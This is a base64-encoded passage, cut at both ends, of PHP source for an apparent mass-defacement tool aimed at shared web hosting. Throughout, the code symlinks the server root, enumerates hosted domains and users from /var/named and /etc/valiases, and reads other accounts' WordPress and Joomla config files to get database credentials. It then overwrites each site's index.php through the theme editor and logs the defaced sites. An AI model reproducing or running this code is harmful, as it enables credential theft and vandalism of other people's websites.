FUSU9OLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyYWdlbnQpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgIkNPT0tJRS50eHQiKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAiQ09PS0lFLnR4dCIpOw0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KY3VybF9jbG9zZSgkY2gpOw0KDQokcG9zID0gc3RycG9zKCRidWZmZXIsJzxkaXYgaWQ9Im1lc3NhZ2UiIGNsYXNzPSJ1cGRhdGVkIj4nKTsNCmlmKCRwb3MgPT09IGZhbHNlKSB7DQokb3V0cHV0Lj0gIlstXSBVcGRhdGluZyBJbmRleC5waHAgRXJyb3I8YnIgLz4iOw0KfSBlbHNlIHsNCiRvdXRwdXQuPSAiWytdIEluZGV4LnBocCBVcGRhdGVkIFN1Y2Nlc3NmdWx5PGJyIC8+IjsNCiRoayA9IGV4cGxvZGUoJ3B1YmxpY19odG1sJywkX2ZpbGUpOw0KJG91dHB1dC49ICdbK10gRGVmYWNlICcuZmlsZV9nZXRfY29udGVudHMoJHNpdGVfdXJsLnN0cl9yZXBsYWNlKCcvYmxvZycsJycsJGhrWzFdKSk7DQokY29uZCA9IDE7DQp9DQp9IGVsc2Ugew0KJHVybDI9JHNpdGVfdXJsLicvd3AtYWRtaW4vdGhlbWUtZWRpdG9yLnBocD9maWxlPWluZGV4LnBocCZ0aGVtZT0nLiR0ZW1wbGF0ZTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICJDT09LSUUudHh0Iik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgIkNPT0tJRS50eHQiKTsNCiRidWZmZXIwID0gY3VybF9leGVjKCRjaCk7DQoNCiRfd3Bub25jZSA9IHR1bmlzaWEoJGJ1ZmZlcjAsJzxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJfd3Bub25jZSIgbmFtZT0iX3dwbm9uY2UiIHZhbHVlPSInLCciIC8+Jyk7DQokX2ZpbGUgPSB0dW5pc2lhKCRidWZmZXIwLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJywnIiAvPicpOw0KDQppZihzdWJzdHJfY291bnQoJF9maWxlLCJpbmRleC5waHAiKSAhPSAwKXsNCiRvdXRwdXQuPSAiWytdIGluZGV4LnBocCBsb2FkZWQgaW4gVGhlbWUgRWRpdG9yPGJyIC8+IjsNCiR1cmwyPSRzaXRlX3VybC4iL3dwLWFkbWluL3RoZW1lLWVkaXRvci5waHAiOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybDIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsIm5ld2NvbnRlbnQ9Ii5iYXNlNjRfZGVjb2RlKCRjb250ZW50KS4iJmFjdGlvbj11cGRhdGUmZmlsZT0iLiRfZmlsZS4iJnRoZW1lPSIuJHRlbXBsYXRlLiImX3dwbm9uY2U9Ii4kX3dwbm9uY2UuIiZzdWJtaXQ9VXBkYXRlIEZpbGUiKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICJDT09LSUUudHh0Iik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgIkNPT0tJRS50eHQiKTsNCiRidWZmZXIgPSBjdXJsX2V4ZWMoJGNoKTsNCmN1cmxfY2xvc2UoJGNoKTsNCg0KJHBvcyA9IHN0cnBvcygkYnVmZmVyLCc8ZGl2IGlkPSJtZXNzYWdlIiBjbGFzcz0idXBkYXRlZCI+Jyk7DQppZigkcG9zID09PSBmYWxzZSkgew0KICAgICRvdXRwdXQuPSAiWy1dIFVwZGF0aW5nIEluZGV4LnBocCBFcnJvcjxiciAvPiI7DQp9IGVsc2Ugew0KICAgICRvdXRwdXQuPSAiWytdIEluZGV4LnBocCBUZW1wbGF0ZSBVcGRhdGVkIFN1Y2Nlc3NmdWx5PGJyIC8+IjsNCgkkb3V0cHV0Lj0gJ1srXSBEZWZhY2UgJy5maWxlX2dldF9jb250ZW50cygkc2l0ZV91cmwuJy93cC1jb250ZW50L3RoZW1lcy8nLiR0ZW1wbGF0ZS4nL2luZGV4LnBocCcpOw0KICAgICRjb25kID0gMTsNCn0NCn0gZWxzZSB7DQokb3V0cHV0Lj0gIlstXSBpbmRleC5waHAgY2FuIG5vdCBsb2FkIGluIFRoZW1lIEVkaXRvcjxiciAvPiI7DQp9DQp9DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkb3V0cHV0Lj0gIlstXSBEQiBFcnJvcjxiciAvPiI7DQogICAgfQ0KICAgIGdsb2JhbCAkYmFzZV9wYXRoOw0KICAgIHVubGluaygkYmFzZV9wYXRoLidDT09LSUUudHh0Jyk7DQogICAgcmV0dXJuIGFycmF5KCdjb25kJz0+JGNvbmQsICdvdXRwdXQnPT4kb3V0cHV0ICwgJ3RlbXBsYXRlJz0+ICR0ZW1wbGF0ZSk7DQp9DQoNCmlmKCRfUE9TVFsnbW9kZSddPT0yKSB7DQovLyBzeW1saW5raW5nIA0KQG1rZGlyKCdzeW0nLDA3NzcpOw0KJGh0YWNjZXNzICA9ICJPcHRpb25zIGFsbCBcbiBEaXJlY3RvcnlJbmRleCBTdXguaHRtbCBcbiBBZGRUeXBlIHRleHQvcGxhaW4gLnBocCBcbiBBZGRIYW5kbGVyIHNlcnZlci1wYXJzZWQgLnBocCBcbiBBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwgXG4gQWRkSGFuZGxlciB0eHQgLmh0bWwgXG4gUmVxdWlyZSBOb25lIFxuIFNhdGlzZnkgQW55IjsNCmZpbGVfcHV0X2NvbnRlbnRzKCJzeW0vLmh0YWNjZXNzIiwkaHRhY2Nlc3MpOw0KQHN5bWxpbmsoJy8nLCdzeW0vcm9vdCcpOw0KDQoNCi8vIGdldHRpbmcgc2l0ZXMgZnJvbSAoL3Zhci9uYW1lZCkgZmlsZQ0KJG5hbWVkPWZpbGVfZ2V0X2NvbnRlbnRzKCRiYXNlX3VybC4nL3N5bS9yb290L3Zhci9uYW1lZC8nKTsNCiRhciA9IGV4cGxvZGUoJzxsaT48YSBocmVmPSInLCAkbmFtZWQpOw0KZm9yKCR2aT0yOyR2aSA8IGNvdW50KCRhcik7JHZpKyspDQogICAgIHsNCiR2YXIxID0gc3RydG9rKCRhclskdmldLCAiICIpOw0KJHZhcjEgPSBzdWJzdHIoJHZhcjEsMCwtMik7DQokb2xkPSgnLmRiJyk7DQokbmV3PSgnJyk7DQokc2l0ZXMgPSBzdHJfcmVwbGFjZSgkb2xkICwgJG5ldyAsICR2YXIxKTsNCmZpbGVfcHV0X2NvbnRlbnRzKCdzaXRlcy50eHQnLCRzaXRlcyk7DQp9DQoNCi8vIGdldHRpbmcgdXNlcm5hbWVzDQokZG9tYWlucz1maWxlKCdzaXRlcy50eHQnKTsNCmZvcmVhY2ggKCRkb21haW5zIGFzICRkb21haW4pIHsNCiRvcmRlcj0oImxzIC1sYSAvZXRjL3ZhbGlhc2VzLyIuJGRvbWFpbik7DQokZXhlYz1leGVjKCRvcmRlcik7DQokZmlsZW5hbWUgPSAnbWFpbC50eHQnOw0KJGZwID0gZm9wZW4oJGZpbGVuYW1lLCAiYSsiKTsNCiR3cml0ZSA9IGZwdXRzKCRmcCwgJGV4ZWMuIlxuIik7DQpmY2xvc2UoJGZwKTsNCn0NCg0KJG1haWw9ZmlsZSgnbWFpbC50eHQnKTsNCmZvcmVhY2ggKCRtYWlsIGFzICRmaW5hbGRvbSkgew0KJHVzZXI9dHVuaXNpYSgkZmluYWxkb20sIi1ydy1yLS0tLS0gMSAiLCIgbWFpbCIpOw0KJHNpdGU9c3Vic3RyKHN0cnN0cigkZmluYWxkb20sICcvZXRjL3ZhbGlhc2VzJyksMTQpOw0KDQokZmlsZW5hbWUgPSAndXNlcmRvbS50eHQnOw0KJGZwID0gZm9wZW4oJGZpbGVuYW1lLCAiYSsiKTsNCiR3cml0ZSA9IGZwdXRzKCRmcCwgJHVzZXIuIjoiLiAkc2l0ZS4iICIpOw0KZmNsb3NlKCRmcCk7DQoNCn0NCg0KJGY9ZmlsZV9nZXRfY29udGVudHMoJ3VzZXJkb20udHh0Jyk7DQokZmluYWxzPWV4cGxvZGUoIiAiLCRmKTsNCmZvcmVhY2ggKCRmaW5hbHMgYXMgJGZpbmFsKXsNCiRzdHJsZW49KCc2Jyk7DQokZHI9c3RybGVuICgkZmluYWwpOw0KaWYgKCRkciA8ICRzdHJsZW4pIHsNCiRmaWxlbmFtZSA9ICdmYWlsLnR4dCc7DQokZnAgPSBmb3BlbigkZmlsZW5hbWUsICJhIik7DQokd3JpdGUgPSBmcHV0cygkZnAsICRmaW5hbCk7DQpmY2xvc2UoJGZwKTsNCn0NCmVsc2Ugew0KJGZpbGVuYW1lID0gJ3N1Y2Nlc3MudHh0JzsNCiRmcCA9IGZvcGVuKCRmaWxlbmFtZSwgImEiKTsNCiR3cml0ZSA9IGZwdXRzKCRmcCwgJGZpbmFsLiJcbiIpOw0KZmNsb3NlKCRmcCk7DQp9DQp9DQoNCi8vIG5vdyB0byB3b3JrDQokaW5kZXg9JF9QT1NUWyd0dW5pc2lhJ107DQokdXJsPSgkYmFzZV91cmwpOw0KJGE9ZmlsZSgkYmFzZV91cmwuJy9zdWNjZXNzLnR4dCcpOw0KZWNobyAoIjxjZW50ZXI+PHRhYmxlIGNsYXNzPSdyZXN1bHQnIHdpZHRoPScxMDAlJyBib3JkZXI9MSBjZWxsc3BhY2luZz0xIGNlbGxwYWRpbmc9MT4gIA0KPHRyPjx0aCB3aWR0aD01MCU+ZG9tYWluPC90ZD48dGggd2lkdGg9MjUlPlR5cGU8L3RkPjx0aCB3aWR0aD0yNSU+U3RhdHVzPC90ZD48L3RyPiIpOw0KJGtoYWxlZCA9IGZvcGVuKCdkZWZhY2VkLmh0bWwnLCAnYSsnKTsNCmZvcmVhY2ggKCRhIGFzICRmaW5hbCkgew0KbGlzdCgkdXNlciwgJHNpdGVfdXJsKSA9IGV4cGxvZGUoIjoiLCAkZmluYWwpOw0KJHNpdGVfdXJsdG8gPSBzdWJzdHIoJHNpdGVfdXJsLCAwLCAtMSk7DQovLyBqb29tbGEgc3ltbGlua3MNCiRqb29tbGE9JHVybC4iL3N5bS9yb290L2hvbWUvIi4kdXNlci4iL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwIjsNCiRqb29tbGEyPSR1cmwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXIuIi9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAiOw0KJGpvb21sYTM9JHVybC4iL3N5bS9yb290L2hvbWUvIi4kdXNlci4iL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAiOw0KLy8gd29yZHByZXNzIHN5bWxpbmtzDQokd29yZHByZXNzPSR1cmwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXIuIi9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwIjsNCiR3b3JkcHJlc3MyPSR1cmwuIi9zeW0vcm9vdC9ob21lLyIuJHVzZXIuIi9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAiOw0KJHdvcmRwcmVzczM9JHVybC4iL3N5bS9yb290L2hvbWUvIi4kdXNlci4iL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAiOw0KDQovLyBmaXJzdCBqb29tbGEgZ3Vlc3MNCmlmKCRqb29tbGEgJiYgcHJlZ19tYXRjaCgnL2RicHJlZml4L2knLCRqb29tbGEpKXsNCmVjaG8gJzx0cj48dGQ+PGEgaHJlZj0iaHR0cDovLycuJHNpdGVfdXJsdG8uJyIgdGFyZ2V0PSJibGFuayI+Jy4kc2l0ZV91cmx0by4nPC9hPjwvdGQ+JzsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48Zm9udCBjb2xvcj0icGluayI+Sk9PTUxBPC9mb250PjwvdGQ+JzsNCiRyZXMgPSBpbmRleF9jaGFuZ2VyX2pvb21sYSgkam9vbWxhLCAkaW5kZXgsICRzaXRlX3VybHRvKTsNCmVjaG8gJzx0ZD4nLiRyZXNbJ291dHB1dCddLic8L3RkPic7DQppZigkcmVzWydjb25kJ10pIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0iZ3JlZW4iPkRFRkFDRUQ8L3NwYW4+PC90ZD4nOw0KZndyaXRlKCRraGFsZWQsICdodHRwOi8vJy4kc2l0ZV91cmx0by4nL3RlbXBsYXRlcy8nLiRyZXNbJ3RlbXBsYXRlJ10uJy9pbmRleC5waHA8YnI+Jyk7DQokY291bnQxID0gJGNvdW50MSsxOw0KfSBlbHNlIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0icmVkIj5GQUlMRUQ8L3NwYW4+PC90ZD4nOw0KfQ0KZWNobyAnPC90cj4nOw0KfQ0KLy8gc2Vjb25kIGpvb21sYSBndWVzcw0KaWYoJGpvb21sYTIgJiYgcHJlZ19tYXRjaCgnL2RicHJlZml4L2knLCRqb29tbGEyKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRzaXRlX3VybHRvLiciIHRhcmdldD0iYmxhbmsiPicuJHNpdGVfdXJsdG8uJzwvYT48L3RkPic7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PGZvbnQgY29sb3I9InBpbmsiPkpPT01MQTwvZm9udD48L3RkPic7DQokcmVzID0gaW5kZXhfY2hhbmdlcl9qb29tbGEoJGpvb21sYTIsICRpbmRleCwgJHNpdGVfdXJsdG8pOw0KZWNobyAnPHRkPicuJHJlc1snb3V0cHV0J10uJzwvdGQ+JzsNCmlmKCRyZXNbJ2NvbmQnXSkgew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJncmVlbiI+REVGQUNFRDwvc3Bhbj48L3RkPic7DQpmd3JpdGUoJGtoYWxlZCwgJ2h0dHA6Ly8nLiRzaXRlX3VybHRvLicvam9vbWxhLycuJHJlc1sndGVtcGxhdGUnXS4nL2luZGV4LnBocDxicj4nKTsNCiRjb3VudDEgPSAkY291bnQxKzE7DQp9IGVsc2Ugew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJyZWQiPkZBSUxFRDwvc3Bhbj48L3RkPic7DQp9DQplY2hvICc8L3RyPic7DQp9DQovLyB0aGlyZCBqb29tbGEgZ3Vlc3MNCmlmKCRqb29tbGEzICYmIHByZWdfbWF0Y2goJy9kYnByZWZpeC9pJywkam9vbWxhMykpew0KZWNobyAnPHRyPjx0ZD48YSBocmVmPSJodHRwOi8vJy4kc2l0ZV91cmx0by4nIiB0YXJnZXQ9ImJsYW5rIj4nLiRzaXRlX3VybHRvLic8L2E+PC90ZD4nOw0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxmb250IGNvbG9yPSJwaW5rIj5KT09NTEE8L2ZvbnQ+PC90ZD4nOw0KJHJlcyA9IGluZGV4X2NoYW5nZXJfam9vbWxhKCRqb29tbGEzLCAkaW5kZXgsICRzaXRlX3VybHRvKTsNCmVjaG8gJzx0ZD4nLiRyZXNbJ291dHB1dCddLic8L3RkPic7DQppZigkcmVzWydjb25kJ10pIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0iZ3JlZW4iPkRFRkFDRUQ8L3NwYW4+PC90ZD4nOw0KZndyaXRlKCRraGFsZWQsICdodHRwOi8vJy4kc2l0ZV91cmx0by4nL3NpdGUvJy4kcmVzWyd0ZW1wbGF0ZSddLicvaW5kZXgucGhwPGJyPicpOw0KJGNvdW50MSA9ICRjb3VudDErMTsNCn0gZWxzZSB7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PHNwYW4gY2xhc3M9InJlZCI+RkFJTEVEPC9zcGFuPjwvdGQ+JzsNCn0NCmVjaG8gJzwvdHI+JzsNCn0NCg0KLy8gZmlyc3Qgd29yZHByZXNzIGd1ZXNzDQppZigkd29yZHByZXNzICYmIHByZWdfbWF0Y2goJy9EQl9OQU1FL2knLCR3b3JkcHJlc3MpKXsNCmVjaG8gJzx0cj48dGQ+PGEgaHJlZj0iaHR0cDovLycuJHNpdGVfdXJsdG8uJyIgdGFyZ2V0PSJibGFuayI+Jy4kc2l0ZV91cmx0by4nPC9hPjwvdGQ+JzsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48Zm9udCBjb2xvcj0ieWVsbG93Ij5XT1JEUFJFU1M8L2ZvbnQ+PC90ZD4nOw0KJHJlcyA9IGluZGV4X2NoYW5nZXJfd3AoJHdvcmRwcmVzcywgJGluZGV4KTsNCmVjaG8gJzx0ZD4nLiRyZXNbJ291dHB1dCddLic8L3RkPic7DQppZigkcmVzWydjb25kJ10pIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0iZ3JlZW4iPkRFRkFDRUQ8L3NwYW4+PC90ZD4nOw0KZndyaXRlKCRraGFsZWQsICdodHRwOi8vJy4kc2l0ZV91cmx0by4nL3dwLWNvbnRlbnQvdGhlbWVzLycuJHJlc1sndGVtcGxhdGUnXS4nL2luZGV4LnBocDxicj4nKTsNCiRjb3VudDIrKzsNCn0gZWxzZSB7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PHNwYW4gY2xhc3M9InJlZCI+RkFJTEVEPC9zcGFuPjwvdGQ+JzsNCn0NCmVjaG8gJzwvdHI+JzsNCiAgICAgICAgfQ0KCQkNCi8vIHNlY29uZCB3b3JkcHJlc3MgZ3Vlc3MNCmlmKCR3b3JkcHJlc3MyICYmIHByZWdfbWF0Y2goJy9EQl9OQU1FL2knLCR3b3JkcHJlc3MyKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRzaXRlX3VybHRvLiciIHRhcmdldD0iYmxhbmsiPicuJHNpdGVfdXJsdG8uJzwvYT48L3RkPic7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PGZvbnQgY29sb3I9InllbGxvdyI+V09SRFBSRVNTPC9mb250PjwvdGQ+JzsNCiRyZXMgPSBpbmRleF9jaGFuZ2VyX3dwKCR3b3JkcHJlc3MyLCAkaW5kZXgpOw0KZWNobyAnPHRkPicuJHJlc1snb3V0cHV0J10uJzwvdGQ+JzsNCmlmKCRyZXNbJ2NvbmQnXSkgew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJncmVlbiI+REVGQUNFRDwvc3Bhbj48L3RkPic7DQpmd3JpdGUoJGtoYWxlZCwgJ2h0dHA6Ly8nLiRzaXRlX3VybHRvLicvYmxvZy93cC1jb250ZW50L3RoZW1lcy8nLiRyZXNbJ3RlbXBsYXRlJ10uJy9pbmRleC5waHA8YnI+Jyk7DQokY291bnQyKys7DQp9IGVsc2Ugew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJyZWQiPkZBSUxFRDwvc3Bhbj48L3RkPic7DQp9DQplY2hvICc8L3RyPic7DQogICAgICAgIH0NCgkJDQovLyB0aGlyZCB3b3JkcHJlc3MgZ3Vlc3MNCmlmKCR3b3JkcHJlc3MzICYmIHByZWdfbWF0Y2goJy9EQl9OQU1FL2knLCR3b3JkcHJlc3MzKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRzaXRlX3VybHRvLiciIHRhcmdldD0iYmxhbmsiPicuJHNpdGVfdXJsdG8uJzwvYT48L3RkPic7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PGZvbnQgY29sb3I9InllbGxvdyI+V09SRFBSRVNTPC9mb250PjwvdGQ+JzsNCiRyZXMgPSBpbmRleF9jaGFuZ2VyX3dwKCR3b3JkcHJlc3MzLCAkaW5kZXgpOw0KZWNobyAnPHRkPicuJHJlc1snb3V0cHV0J10uJzwvdGQ+JzsNCmlmKCRyZXNbJ2NvbmQnXSkgew0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxzcGFuIGNsYXNzPSJncmVlbiI+REVGQUNFRDwvc3Bhbj48L3RkPic7DQpmd3JpdGUoJGtoYWxlZCwgJ2h0dHA6Ly8nLiRzaXRlX3VybHRvLicvd3Avd3AtY29udGVudC90aGVtZXMvJy4kcmVzWyd0ZW1wbGF0ZSddLicvaW5kZXgucGhwPGJyPicpOw0KJGNvdW50MisrOw0KfSBlbHNlIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0icmVkIj5GQUlMRUQ8L3NwYW4+PC90ZD4nOw0KfQ0KZWNobyAnPC90cj4nOw0KICAgICAgICB9DQoJDQp9DQplY2hvICc8L3RhYmxlPic7DQplY2hvICc8aHIvPic7DQplY2hvICdUb3RhbCBEZWZhY2VkID0gJy4oJGNvdW50MSskY291bnQyKS4nIChKT09NTEEgPSAnLiRjb3VudDEuJywgV09SRFBSRVNTID0gJy4kY291bnQyLicpPGJyIC8+JzsNCmVjaG8gJzxhIGhyZWY9ImRlZmFjZWQuaHRtbCIgdGFyZ2V0PSJfYmxhbmsiPlNob3cgQWxsPC9hPjxiciAvPic7DQp9DQoNCmVsc2VpZigkX1BPU1RbJ21vZGUnXT09MSkgew0KICAgIEBta2Rpcignc3ltJywwNzc3KTsNCiAgICAkd3IgID0gIk9wdGlvbnMgYWxsIFxuIERpcmVjdG9yeUluZGV4IFN1eC5odG1sIFxuIEFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIFxuIEFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwIFxuICBBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwgXG4gQWRkSGFuZGxlciB0eHQgLmh0bWwgXG4gUmVxdWlyZSBOb25lIFxuIFNhdGlzZnkgQW55IjsNCiAgICAkZnAgPSBAZm9wZW4gKCdzeW0vLmh0YWNjZXNzJywndycpOw0KICAgIGZ3cml0ZSgkZnAsICR3cik7DQogICAgQHN5bWxpbmsoJy8nLCdzeW0vcm9vdCcpOw0KICAgICRkb21pbmlvcyA9IEBmaWxlX2dldF9jb250ZW50cygiL2V0Yy9uYW1lZC5jb25mIik7DQogICAgQHByZWdfbWF0Y2hfYWxsKCcvLio/em9uZSAiKC4qPykiIHsvJywgJGRvbWluaW9zLCAkb3V0KTsNCiAgICAkb3V0WzFdID0gYXJyYXlfdW5pcXVlKCRvdXRbMV0pOw0KICAgICRudW1lcm9fZG9taW5pb3MgPSBjb3VudCgkb3V0WzFdKTsNCiAgICBlY2hvICJUb3RhbCBkb21haW5zOiAkbnVtZXJvX2RvbWluaW9zIDxicj48YnIgLz4iOw0KICAgICRkZWYgPSAkX1BPU1RbJ3R1bmlzaWEnXTsNCiAgICAkYmFzZV91cmwgPSAnaHR0cDovLycuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uZGlybmFtZSgkX1NFUlZFUlsnU0NSSVBUX05BTUUnXSkuJy9zeW0vcm9vdC9ob21lLyc7DQogICAgJG91dHB1dCA9IGZvcGVuKCdkZWZhY2VkLmh0bWwnLCAnYSsnKTsNCgllY2hvICgiPGNlbnRlcj48dGFibGUgY2xhc3M9J3Jlc3VsdCcgd2lkdGg9JzEwMCUnIGJvcmRlcj0xIGNlbGxzcGFjaW5nPTEgY2VsbHBhZGluZz0xPiAgDQoJPHRyPjx0aCB3aWR0aD01MCU+ZG9tYWluPC90ZD48dGggd2lkdGg9MjUlPlR5cGU8L3RkPjx0aCB3aWR0aD0yNSU+U3RhdHVzPC90ZD48L3RyPiIpOyAgIA0KICAgJGogPSAxOw0KICAgICRzdCA9IChpc3NldCgkX0dFVFsnc3QnXSkgJiYgJF9HRVRbJ3N0J10hPScnKSA/ICRfR0VUWydzdCddIDogMDsNCiAgICBmb3IoJGkgPSAkc3Q7ICRpIDw9ICRudW1lcm9fZG9taW5pb3M7ICRpKyspDQogICAgew0KICAgICAgICAkZG9tYWluID0gJG91dFsxXVskaV07DQogICAgICAgICRkb25vX2FycXVpdm8gPSBAZmlsZW93bmVyKCIvZXRjL3ZhbGlhc2VzLyIuJGRvbWFpbik7DQogICAgICAgICRpbmZvcyA9IEBwb3NpeF9nZXRwd3VpZCgkZG9ub19hcnF1aXZvKTsNCiAgICAgICAgDQogICAgICAgIGlmKCRpbmZvc1snbmFtZSddIT0ncm9vdCcpIHsNCiRjb25maWcwMSA9IEBmaWxlX2dldF9jb250ZW50cygkYmFzZV91cmwuJGluZm9zWyduYW1lJ10uIi9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCIpOw0KJGNvbmZpZzAwMSA9IEBmaWxlX2dldF9jb250ZW50cygkYmFzZV91cmwuJGluZm9zWyduYW1lJ10uIi9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAiKTsNCiRjb25maWcwMiA9IEBmaWxlX2dldF9jb250ZW50cygkYmFzZV91cmwuJGluZm9zWyduYW1lJ10uIi9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwIik7DQokY29uZmlnMDMgPSBAZmlsZV9nZXRfY29udGVudHMoJGJhc2VfdXJsLiRpbmZvc1snbmFtZSddLiIvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwIik7DQoNCmlmKCRjb25maWcwMDEgJiYgcHJlZ19tYXRjaCgnL2RicHJlZml4L2knLCRjb25maWcwMDEpKXsNCmVjaG8gJzx0cj48dGQ+PGEgaHJlZj0iaHR0cDovLycuJGRvbWFpbi4nIiB0YXJnZXQ9ImJsYW5rIj4nLiRkb21haW4uJzwvYT48L3RkPic7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PGZvbnQgY29sb3I9InBpbmsiPkpPT01MQTwvZm9udD48L3RkPic7DQokcmVzID0gaW5kZXhfY2hhbmdlcl9qb29tbGEoJGNvbmZpZzAwMSwgJGRlZiwgJGRvbWFpbik7DQplY2hvICc8dGQ+Jy4kcmVzWydvdXRwdXQnXS4nPC90ZD4nOw0KaWYoJHJlc1snY29uZCddKSB7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PHNwYW4gY2xhc3M9ImdyZWVuIj5ERUZBQ0VEPC9zcGFuPjwvdGQ+JzsNCmZ3cml0ZSgkb3V0cHV0LCAnaHR0cDovLycuJGRvbWFpbi4iPGJyPiIpOw0KJGNvdW50MSA9ICRjb3VudCsxOw0KfSBlbHNlIHsNCmVjaG8gJzx0ZCBhbGlnbj0iY2VudGVyIj48c3BhbiBjbGFzcz0icmVkIj5GQUlMRUQ8L3NwYW4+PC90ZD4nOw0KfQ0KZWNobyAnPC90cj4nOw0KfQ0KICAgICAgICANCmlmKCRjb25maWcwMSAmJiBwcmVnX21hdGNoKCcvZGJwcmVmaXgvaScsJGNvbmZpZzAxKSl7DQplY2hvICc8dHI+PHRkPjxhIGhyZWY9Imh0dHA6Ly8nLiRkb21haW4uJyIgdGFyZ2V0PSJibGFuayI+Jy4kZG9tYWluLic8L2E+PC90ZD4nOw0KZWNobyAnPHRkIGFsaWduPSJjZW50ZXIiPjxmb250IGNvbG9yPSJwaW5rIj5KT09NTEE8L2ZvbnQ+PC90ZD4nOw0KJHJlcyA9IGluZGV4X2NoYW5nZXJfam9vbWxhKCRjb25maWcwMSwgJGRlZiwgJGRvbWFpbik7DQplY2hvICc8dGQ+Jy4kcmVzWydvdXRwdXQnXS4nPC90ZD4nOw0KaWYoJHJlc1snY29uZCddKSB7DQplY2hvICc8dGQgYWxpZ249ImNlbnRlciI+PHNwYW4gY2xhc3M9ImdyZWVuIj5ERUZBQ0VEPC9zcGFuPjwvdGQ+JzsNCmZ3cml0ZSgkb3V0cHV0LCAnaHR0cDovLycuJGRvbWFpbi4iPGJyPiIpOw0KJGNvdW50MSA9ICRjb3VudCsxOw0KfSBlb